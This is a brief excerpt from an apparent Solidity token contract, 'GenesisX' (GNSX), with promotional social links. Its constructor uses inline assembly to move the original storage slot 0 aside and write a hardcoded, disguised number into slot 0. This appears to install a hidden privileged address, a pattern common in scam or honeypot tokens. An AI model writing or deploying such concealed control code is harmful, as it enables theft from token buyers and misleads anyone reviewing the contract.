...
Telegram: https://t.me/GenesisX/
Twitter: https://twitter.com/GenesisX/
Website: https://GenesisX.io
...
contract GenesisX {
    string public constant name = "GenesisX";
    string public constant symbol = "GNSX";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(206175633598101093965543740022290816194858922197, 2))}
